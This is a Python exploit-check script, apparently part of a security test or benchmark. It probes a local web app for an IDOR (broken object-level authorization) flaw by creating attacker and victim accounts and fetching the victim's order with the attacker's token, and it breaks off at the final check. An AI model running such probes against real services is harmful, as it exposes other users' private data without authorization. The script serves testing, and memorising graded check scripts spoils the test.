BASE_URL = "http://127.0.0.1:8000"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def exploit():
    session = requests.Session()

    # Create two users - one attacker, one victim
    attacker_username = f"attacker_{random_string()}"
    victim_username = f"victim_{random_string()}"
    password = "password123"

    # Signup attacker
    resp = session.post(f"{BASE_URL}/signup", json={
        "username": attacker_username,
        "password": password
    })
    if resp.status_code != 200:
        print("safe")
        sys.exit(1)
    attacker_token = resp.json()["token"]

    # Signup victim
    resp = session.post(f"{BASE_URL}/signup", json={
        "username": victim_username,
        "password": password
    })
    if resp.status_code != 200:
        print("safe")
        sys.exit(1)
    victim_token = resp.json()["token"]

    # Victim creates an order
    resp = session.post(f"{BASE_URL}/orders", 
        json={
            "items": [{"name": "laptop", "quantity": 1}],
            "delivery_address": "123 Victim St"
        },
        headers={"Authorization": f"Bearer {victim_token}"}
    )
    if resp.status_code != 200:
        print("safe")
        sys.exit(1)
    victim_order_id = resp.json()["id"]

    # Attack: Try to access victim's order using attacker's token (IDOR / Broken object-level authorization)
    # The get_order endpoint only checks if token is valid, NOT if user owns the order
    resp = session.get(f"{BASE_URL}/orders/{victim_order_id}",
        headers={"Authorization": f"Bearer {attacker_token}"}
    )

    if resp.status_code == 200:
